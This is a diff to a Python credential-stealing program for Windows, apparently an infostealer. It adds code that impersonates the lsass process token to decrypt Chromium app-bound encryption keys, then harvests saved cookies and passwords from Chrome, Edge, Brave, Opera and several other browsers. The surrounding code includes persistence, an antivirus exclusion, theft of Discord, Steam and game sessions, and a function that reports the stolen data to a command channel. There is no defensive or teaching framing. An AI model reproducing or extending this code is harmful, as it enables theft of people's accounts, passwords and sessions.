@@ -1,26 +1,37 @@
 import os
 import ctypes
+import io
 import platform
 import re
+import struct
 import time
 import base64
 import threading
+import multiprocessing
 import sqlite3
 import zipfile
 import win32crypt
 import psutil
 import shutil
+import binascii
 import json
 import sys
 import requests
 import subprocess
 import random
+import windows
+import windows.crypto
+import windows.security
+import windows.generated_def as gdef
 import string
 import conf.config as config
 from Crypto.Cipher import AES
 from PIL import ImageGrab
+from contextlib import contextmanager
 from datetime import datetime
+from io import BytesIO
 
+multiprocessing.freeze_support()
 
 def write(file, content):
     with open(file, 'a', encoding='utf-8') as f:
@@ -47,6 +58,147 @@ def removefile(file):
     except:
         pass
 
+def get_master_keyv2(local_state_path, nkey): #plagarized this from https://github.com/yanaksalvo/Browser-Data-Cookie-Extractor pls check ts one out
+    try:
+        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
+            local_state = json.load(f)
+        if 'os_crypt' not in local_state:
+            return None
+        if 'app_bound_encrypted_key' in local_state['os_crypt']:
+            enc_key = binascii.a2b_base64(local_state['os_crypt']['app_bound_encrypted_key'])[4:]
+        elif 'encrypted_key' in local_state['os_crypt']:
+            enc_key = binascii.a2b_base64(local_state['os_crypt']['encrypted_key'])[5:]
+            return windows.crypto.dpapi.unprotect(enc_key)
+        else:
+            return None
+        with impersonate_lsass():
+            system_dec = windows.crypto.dpapi.unprotect(enc_key)
+        user_dec = windows.crypto.dpapi.unprotect(system_dec)
+        parsed = parse_key_blob(user_dec)
+        if parsed['flag'] not in (1, 2, 3):
+            return user_dec[-32:]
+        return derive_v20_master_key(parsed, nkey)
+    except Exception as e:
+        print('error getting master key', e)
+        return None
+
+@contextmanager
+def impersonate_lsass():
+    original_token = windows.current_thread.token
+    try:
+        windows.current_process.token.enable_privilege("SeDebugPrivilege")
+        proc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
+        lsass_token = proc.token
+        impersonation_token = lsass_token.duplicate(
+            type=gdef.TokenImpersonation,
+            impersonation_level=gdef.SecurityImpersonation
+        )
+        windows.current_thread.token = impersonation_token
+        yield
+    except Exception as e:
+        print(f"Error impersonating lsass: {str(e)}", "ERROR")
+    finally:
+        windows.current_thread.token = original_token
+
+def parse_key_blob(blob_data: bytes) -> dict:
+    buffer = io.BytesIO(blob_data)
+    parsed_data = {}
+    header_len = struct.unpack('<I', buffer.read(4))[0]
+    parsed_data['header'] = buffer.read(header_len)
+    content_len = struct.unpack('<I', buffer.read(4))[0]
+    parsed_data['flag'] = buffer.read(1)[0]
+    if parsed_data['flag'] in (1, 2):
+        parsed_data['iv'] = buffer.read(12)
+        parsed_data['ciphertext'] = buffer.read(32)
+        parsed_data['tag'] = buffer.read(16)
+    elif parsed_data['flag'] == 3:
+        parsed_data['encrypted_aes_key'] = buffer.read(32)
+        parsed_data['iv'] = buffer.read(12)
+        parsed_data['ciphertext'] = buffer.read(32)
+        parsed_data['tag'] = buffer.read(16)
+    else:
+        parsed_data['raw_data'] = buffer.read()
+    return parsed_data
+
+def decrypt_with_cng(input_data, key_name):
+    ncrypt = ctypes.windll.NCRYPT
+    hProvider = gdef.NCRYPT_PROV_HANDLE()
+    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
+    if status != 0:
+        return None
+    hKey = gdef.NCRYPT_KEY_HANDLE()
+    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
+    if status != 0:
+        ncrypt.NCryptFreeObject(hProvider)
+        return None
+    pcbResult = gdef.DWORD(0)
+    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
+    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
+    if status != 0:
+        ncrypt.NCryptFreeObject(hKey)
+        ncrypt.NCryptFreeObject(hProvider)
+        return None
+    buffer_size = pcbResult.value
+    output_buffer = (ctypes.c_ubyte * buffer_size)()
+    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
+                                 ctypes.byref(pcbResult), 0x40)
+    ncrypt.NCryptFreeObject(hKey)
+    ncrypt.NCryptFreeObject(hProvider)
+    if status != 0:
+        return None
+    return bytes(output_buffer[:pcbResult.value])
+
+def byte_xor(ba1, ba2):
+    return bytes(a ^ b for a, b in zip(ba1, ba2))
+
+def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
+    if parsed_data['flag'] == 1:
+        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
+        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
+    elif parsed_data['flag'] == 2:
+        chacha_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+        cipher = ChaCha20_Poly1305.new(key=chacha_key, nonce=parsed_data['iv'])
+        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
+    elif parsed_data['flag'] == 3:
+        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+        with impersonate_lsass():
+            dec_aes = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
+            if not dec_aes:
+                return None
+        xored = byte_xor(dec_aes, xor_key)
+        cipher = AES.new(xored, AES.MODE_GCM, nonce=parsed_data['iv'])
+        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
+    else:
+        return parsed_data.get('raw_data', b'')
+
+def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
+    try:
+        if not encrypted_value or encrypted_value[:3] != b'v20':
+            return "NOT_V20"
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:-16]
+        tag = encrypted_value[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+        decrypted = cipher.decrypt_and_verify(payload, tag)
+        return decrypted[32:].decode('utf-8', errors='replace')
+    except Exception as e:
+        print(f"Error decrypting v20 value: {str(e)}", "ERROR")
+        return "DECRYPT_FAILED"
+
+def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
+    try:
+        if not encrypted_value or encrypted_value[:3] != b'v20':
+            return "NOT_V20"
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:-16]
+        tag = encrypted_value[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+        decrypted = cipher.decrypt_and_verify(payload, tag)
+        return decrypted.decode('utf-8', errors='replace')
+    except Exception as e:
+        print(f"Error decrypting v20 password: {str(e)}", "ERROR")
+        return "DECRYPT_FAILED"
 def removedir(dir_):
     try:
         shutil.rmtree(dir_)
@@ -303,62 +455,143 @@ def stealchromium():
                     removefile(tmpdir)
                     
                 if os.path.exists(cookie_path):
-                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-                   try:
-                       shutil.copy2(cookie_path, tmpdir)
-                       con = sqlite3.connect(tmpdir)
-                       cur = con.cursor()
-                       cur.execute("SELECT host_key, name, path, encrypted_value, is_secure FROM cookies")
-                       try:
-                           for host, c0name, c0path, value, c0secure in cur.fetchall():
-                               line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{2597573456}\t{c0name}\t{decrypt_password(value, master_key)}\n"
-                               write(cookieoutput, line)
-                               cookie_count += 1
-                       except Exception as e:
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    try:
+                        shutil.copy2(cookie_path, tmpdir)
+                        con = sqlite3.connect(tmpdir)
+                        cur = con.cursor()
+                        cur.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
+                        try:
+                            for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
+                                line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{expiry}\t{c0name}\t{decrypt_password(value, master_key)}\n"
+                                write(cookieoutput, line)
+                                cookie_count += 1
+                        except Exception as e:
                            pass
-                       cur.close()
-                       con.close()
-                       removefile(tmpdir)
-                   except:
-                       pass
+                        cur.close()
+                        con.close()
+                        removefile(tmpdir)
+                    except:
+                        pass
                    
                 if os.path.exists(password_path):
-                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-                   shutil.copy2(password_path, tmpdir)
-                   con = sqlite3.connect(tmpdir)
-                   cur = con.cursor()
-                   cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-                   try:
-                       for host, c0name, value in cur.fetchall():
-                           if c0name and value:
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    shutil.copy2(password_path, tmpdir)
+                    con = sqlite3.connect(tmpdir)
+                    cur = con.cursor()
+                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    try:
+                        for host, c0name, value in cur.fetchall():
+                            if c0name and value:
                                line = f"URL: {host}\nUSERNAME: {c0name}\nPASSWORD: {decrypt_password(value, master_key)}\n---------------------------------\n"
                                write(passwordoutput, line)
                                password_count += 1
-                   except Exception as e:
-                       pass
-                   cur.close()
-                   con.close()
-                   removefile(tmpdir)
+                    except Exception as e:
+                        pass
+                    cur.close()
+                    con.close()
+                    removefile(tmpdir)
                    
                 if os.path.exists(history_path):
-                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-                   shutil.copy2(history_path, tmpdir)
-                   con = sqlite3.connect(tmpdir)
-                   cur = con.cursor()
-                   cur.execute("SELECT url, title, visit_count FROM urls")
-                   try:
-                       for w3url, w3name, w3visit in cur.fetchall():
-                           line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
-                           write(historyoutput, line)
-                           browsing_history += 1
-                   except Exception as e:
-                       pass
-                   cur.close()
-                   con.close()
-                   removefile(tmpdir)
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    shutil.copy2(history_path, tmpdir)
+                    con = sqlite3.connect(tmpdir)
+                    cur = con.cursor()
+                    cur.execute("SELECT url, title, visit_count FROM urls")
+                    try:
+                        for w3url, w3name, w3visit in cur.fetchall():
+                            line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
+                            write(historyoutput, line)
+                            browsing_history += 1
+                    except Exception as e:
+                        pass
+                    cur.close()
+                    con.close()
+                    removefile(tmpdir)
 
 def stealchromiumv20():
-    ...
+    global cookie_count
+    global password_count
+
+    if config.browsers:
+        chromium_paths = {
+            'Chrome': {'path': localappdata + '\\Google\\Chrome\\User Data', 'localstate': localappdata + '\\Google\\Chrome\\User Data\\Local State', 'key': 'Google Chromekey1'},
+            'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State', 'key': 'Chromiumkey1'},
+            'Cent Browser': {'path': localappdata + '\\CentBrowser\\User Data', 'localstate': localappdata + '\\CentBrowser\\User Data\\Local State', 'key': 'CentBrowserkey1'},
+            'Yandex': {'path': localappdata + '\\Yandex\\YandexBrowser\\User Data', 'localstate': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Local State', 'key': 'Yandexkey1'},
+            'Edge': {'path': localappdata + '\\Microsoft\\Edge\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge\\User Data\\Local State', 'key': 'Microsoft Edgekey1'},
+            'Brave': {'path': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data', 'localstate': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Local State', 'key': 'Brave Softwarekey1'},
+            'Opera': {'path': appdata + '\\Opera Software\\Opera Stable', 'localstate': appdata + '\\Opera Software\\Opera Stable\\Local State', 'key': 'Opera Softwarekey1'},
+            'Opera GX': {'path': appdata + '\\Opera Software\\Opera GX Stable', 'localstate': appdata + '\\Opera Software\\Opera GX Stable\\Local State', 'key': 'Opera Softwarekey1'},
+            'Opera Air': {'path': appdata + '\\Opera Software\\Opera Air Stable', 'localstate': appdata + '\\Opera Software\\Opera Air Stable\\Local State', 'key': 'Opera Softwarekey1'},
+            'Vivaldi': {'path': localappdata + '\\Vivaldi\\User Data', 'localstate': localappdata + '\\Vivaldi\\User Data\\Local State', 'key': 'Vivaldikey1'},
+            }
+
+        for name, path in chromium_paths.items():
+            userdata = path['path']
+            local_state = path['localstate']
+            ncryptkey = path['key']
+            profiles = []
+            if not os.path.exists(userdata):
+                continue
+            for prffl in os.listdir(userdata):
+                if prffl.lower() == 'default' or prffl.lower().startswith('profile'):
+                    profiles.append(prffl)
+
+            for profile in profiles:
+                os.makedirs(os.path.join(output, name, profile), exist_ok=True)
+                cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
+                passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
+                
+                profile_path = os.path.join(userdata, profile)
+
+                cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
+                password_path = os.path.join(profile_path, 'Login Data')
+                
+                master_key = get_master_keyv2(local_state, ncryptkey)
+
+                if os.path.exists(cookie_path):
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    try:
+                        shutil.copy2(cookie_path, tmpdir)
+                        con = sqlite3.connect(tmpdir)
+                        cur = con.cursor()
+                        cur.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
+                        try:
+                            for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
+                                decrypted = decrypt_v20_value(value, master_key)
+                                if not decrypted == 'DECRYPT_FAILED':
+                                    line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{expiry}\t{c0name}\t{decrypted}\n"
+                                    write(cookieoutput, line)
+                                    cookie_count += 1
+                        except Exception as e:
+                            pass
+                        cur.close()
+                        con.close()
+                        removefile(tmpdir)
+                    except:
+                        pass
+                   
+                if os.path.exists(password_path):
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    shutil.copy2(password_path, tmpdir)
+                    con = sqlite3.connect(tmpdir)
+                    cur = con.cursor()
+                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    try:
+                        for host, c0name, value in cur.fetchall():
+                            if c0name and value:
+                                decrypted = decrypt_v20_password(value, master_key)
+                                if not decrypted == 'DECRYPT_FAILED':
+                                    line = f"URL: {host}\nUSERNAME: {c0name}\nPASSWORD: {decrypted}\n---------------------------------\n"
+                                    write(passwordoutput, line)
+                                    password_count += 1
+                    except Exception as e:
+                        pass
+                    cur.close()
+                    con.close()
+                    removefile(tmpdir)
+                   
     
 def stealgecko():
     global cookie_count
@@ -403,10 +636,10 @@ def stealgecko():
                        shutil.copy2(cookie_path, tmpdir)
                        con = sqlite3.connect(tmpdir)
                        cur = con.cursor()
-                       cur.execute("SELECT host, name, path, value, isSecure FROM moz_cookies")
+                       cur.execute("SELECT host, name, path, value, isSecure, expiry FROM moz_cookies")
                        try:
-                           for host, c0name, c0path, value, c0secure in cur.fetchall():
-                               line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{2597573456}\t{c0name}\t{value}\n"
+                           for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
+                               line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{expiry}\t{c0name}\t{value}\n"
                                write(cookieoutput, line)
                                cookie_count += 1
                        except Exception as e:
@@ -799,7 +1032,7 @@ exclusion(os.getenv('userprofile'))
 
 kill()
 persistence(copypath)
-funcs = [systeminfo, screenshot, stealchromium, stealgecko, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam]
+funcs = [systeminfo, screenshot, stealchromium, stealgecko, stealchromiumv20, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam]
 # systeminfo()
 # screenshot()
 # kill()
@@ -847,7 +1080,7 @@ def sendtoc2(file):
           "embeds": [
             {
               "title": "GOD BLESS AMERICA",
-              "description": f"```Total C00K135: {str(cookie_count)}\nTotal P455W0RDS: {str(password_count)}\nTotal AU70F1LLS: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal D15C0RD: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD S35510N: {'Yes' if gd_session == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nW1F1 N37W0RK5: {str(wifiprofiles)} \n```\n\ncreds: ||{download}||",
+              "description": f"```\nTotal C00K135: {str(cookie_count)}\nTotal P455W0RDS: {str(password_count)}\nTotal AU70F1LLS: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal D15C0RD: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD S35510N: {'Yes' if gd_session == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nW1F1 N37W0RK5: {str(wifiprofiles)} \n```\n\ncreds: ||{download}||",
               "color": 3866871,
               "author": {
                 "name": "KirkG"
